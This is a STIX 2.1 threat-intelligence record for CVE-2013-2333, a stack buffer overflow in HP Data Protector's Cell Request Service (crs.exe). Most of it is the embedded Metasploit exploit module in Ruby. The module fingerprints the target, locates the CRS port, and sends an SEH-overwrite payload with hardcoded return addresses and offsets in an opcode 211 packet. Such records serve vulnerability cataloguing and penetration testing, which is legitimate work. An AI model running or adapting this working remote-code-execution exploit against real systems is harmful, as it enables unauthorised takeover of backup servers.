{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0f4590ca-345a-4bbb-8160-0a2a0ad2f477",
    "created": "2024-08-14T16:47:02.851249Z",
    "modified": "2024-08-14T16:47:02.851253Z",
    "name": "HP Data Protector Cell Request Service Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in the Hewlett-Packard Data Protector product. The vulnerability, due to the insecure usage of _swprintf, exists at the Cell Request Service (crs.exe) when parsing packets with opcode 211. This module has been tested successfully on HP Data Protector 6.20 and 7.00 on Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_crs.rb",
            "external_id": "hp_dataprotector_crs.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2333"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Data Protector Cell Request Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in the Hewlett-Packard Data Protector\n        product. The vulnerability, due to the insecure usage of _swprintf, exists at the Cell\n        Request Service (crs.exe) when parsing packets with opcode 211. This module has been tested\n        successfully on HP Data Protector 6.20 and 7.00 on Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'e6af8de8b1d4b2b6d5ba2610cbf9cd38', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-2333' ],\n          [ 'OSVDB', '93867' ],\n          [ 'BID', '60309' ],\n          [ 'ZDI', '13-130' ]\n        ],\n      'Privileged'     => true,\n      'Payload' =>\n        {\n          'Space'    => 4096,\n          'BadChars' => \"\\x00\\xff\\x20\" # \"\\x00\\x00\", \"\\xff\\xff\" and \"\\x20\\x00\" not allowed\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'HP Data Protector 6.20 build 370 / Windows XP SP3',\n            {\n              'Ret' => 0x00436fe2, # ppr from crs.exe\n              'Offset' => 15578\n            }\n          ],\n          [ 'HP Data Protector 7.00 build 72 / Windows XP SP3',\n            {\n              'Ret' => 0x004cf8c1, # ppr from crs.exe\n              'Offset' => 15578\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-06-03'))\n\n    deregister_options('RPORT') # The CRS service runs on a random port\n  end\n\n  def build_pkt(fields)\n    data = \"\\xff\\xfe\" # BOM Unicode\n    fields.each do |k, v|\n      if k == \"Payload\"\n        data << \"#{v}\\x00\\x00\"\n      else\n        data << \"#{Rex::Text.to_unicode(v)}\\x00\\x00\"\n      end\n      data << Rex::Text.to_unicode(\" \") # Separator\n    end\n\n    data.chomp!(Rex::Text.to_unicode(\" \")) # Delete last separator\n    data << \"\\x00\\x00\" # Ending\n    return [data.length].pack(\"N\") + data\n  end\n\n  def get_fingerprint\n    ommni = connect(false, {'RPORT' => 5555})\n    ommni.put(rand_text_alpha_upper(64))\n    resp = ommni.get_once(-1)\n    disconnect\n\n    if resp.nil?\n      return nil\n    end\n\n    return Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last nl\n  end\n\n  def get_crs_port\n\n    pkt = build_pkt({\n      \"Opcode\"          => \"2\",\n      \"FakeMachineName\" => rand_text_alpha(8),\n      \"Unknown1\"        => \"0\",\n      \"FakeDomainUser\"  => rand_text_alpha(8),\n      \"FakeDomain\"      => rand_text_alpha(8),\n      \"FakeLanguage\"    => rand_text_alpha(8),\n      \"Unknown2\"        => \"15\"\n    })\n    ommni = connect(false, {'RPORT' => 5555})\n    ommni.put(pkt)\n    resp = ommni.get_once(-1)\n    disconnect\n\n    if resp.nil?\n      return nil\n    end\n\n    res_length, bom_unicode, res_data = resp.unpack(\"Nna*\")\n\n    fields = res_data.split(Rex::Text.to_unicode(\" \"))\n\n    opcode = fields[0]\n    port = fields[1]\n\n    if not opcode or not port\n      vprint_error(\"Unexpected response\")\n      return nil\n    end\n\n    opcode = Rex::Text.to_ascii(opcode.chomp(\"\\x00\\x00\"))\n\n    if opcode != \"109\"\n      vprint_error(\"Unexpected opcode #{opcode} in the response\")\n      return nil\n    end\n\n    port = Rex::Text.to_ascii(port.chomp(\"\\x00\\x00\"))\n    return port.to_i\n  end\n\n  def check\n    fingerprint = get_fingerprint\n\n    if fingerprint.nil?\n      vprint_error(\"Unable to fingerprint\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    port = get_crs_port\n\n    if port.nil?\n      vprint_status(\"HP Data Protector version #{fingerprint}\")\n      vprint_error(\"But CRS port not found\")\n    else\n      vprint_status(\"CRS running on port #{port}/TCP, HP Data Protector version #{fingerprint}\")\n    end\n\n    if fingerprint =~ /HP Data Protector A\\.06\\.20: INET, internal build 370/\n      # More likely to be exploitable\n      return Exploit::CheckCode::Appears\n    elsif fingerprint =~ /HP Data Protector A\\.07\\.00: INET, internal build 72/\n      # More likely to be exploitable\n      return Exploit::CheckCode::Appears\n    elsif fingerprint =~ /HP Data Protector A\\.07\\.00/\n      return Exploit::CheckCode::Appears\n    elsif fingerprint =~ /HP Data Protector A\\.07\\.01/\n      return Exploit::CheckCode::Appears\n    elsif fingerprint =~ /HP Data Protector A\\.06\\.20/\n      return Exploit::CheckCode::Appears\n    elsif fingerprint =~ /HP Data Protector A\\.06\\.21/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def get_target\n    fingerprint = get_fingerprint\n\n    if fingerprint.nil?\n      return nil\n    end\n\n    if fingerprint =~ /HP Data Protector A\\.06\\.20: INET, internal build 370/\n      return targets[1]\n    elsif fingerprint =~ /HP Data Protector A\\.07\\.00: INET, internal build 72/\n      return targets[2]\n    else\n      return nil\n    end\n  end\n\n  def exploit\n\n    if target.name =~ /Automatic/\n      print_status(\"Trying to find the target version...\")\n      my_target = get_target\n    else\n      my_target = target\n    end\n\n    if my_target.nil?\n      fail_with(Failure::NoTarget, \"Failed to autodetect target\")\n    end\n\n    print_status(\"Trying to find the CRS service port...\")\n    port = get_crs_port\n    if port.nil?\n      fail_with(Failure::NotFound, \"The CRS service has not been found.\")\n    else\n      print_good(\"CRS service found on #{port}/TCP\")\n      connect(true, {'RPORT' => port})\n    end\n\n    pkt = build_pkt({\n      \"Opcode\"            => \"0\",\n      \"EndPoint\"          => \"GUICORE\",\n      \"ClientFingerprint\" => \"HP OpenView OmniBack II A.06.20\",\n      \"FakeUsername\"      => rand_text_alpha(8),\n      \"FakeDomain\"        => rand_text_alpha(8),\n      \"Unknown1\"          => \"488\",\n      \"Unknown2\"          => rand_text_alpha(8)\n    })\n    print_status(\"Sending packet with opcode 0...\")\n    sock.put(pkt)\n    data = sock.get_once(-1)\n\n    if data.nil?\n      fail_with(Failure::Unknown, \"Error while communicating with the CRS Service\")\n    end\n\n    if Rex::Text.to_ascii(data) !~ /NT-5\\.1/\n      fail_with(Failure::NoTarget, \"Exploit only compatible with Windows XP targets\")\n    end\n\n    pkt = build_pkt({\n      \"Opcode\" => \"225\"\n    })\n    print_status(\"Sending packet with opcode 225...\")\n    sock.put(pkt)\n    data = sock.get_once(-1)\n\n    if data.nil?\n      fail_with(Failure::Unknown, \"Error while communicating with the CRS Service\")\n    end\n\n    bof = payload.encoded\n    bof << rand_text(my_target[\"Offset\"] - payload.encoded.length)\n    bof << generate_seh_record(my_target.ret)\n    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{my_target['Offset']+8}\").encode_string\n    bof << rand_text(100) # Trigger Exception\n\n    pkt = build_pkt({\n      \"Opcode\"  => \"211\",\n      \"Payload\" => bof\n    })\n    print_status(\"Sending malicious packet with opcode 211...\")\n    sock.put(pkt)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-03",
    "x_mitre_platforms": [
        "win'"
    ]
}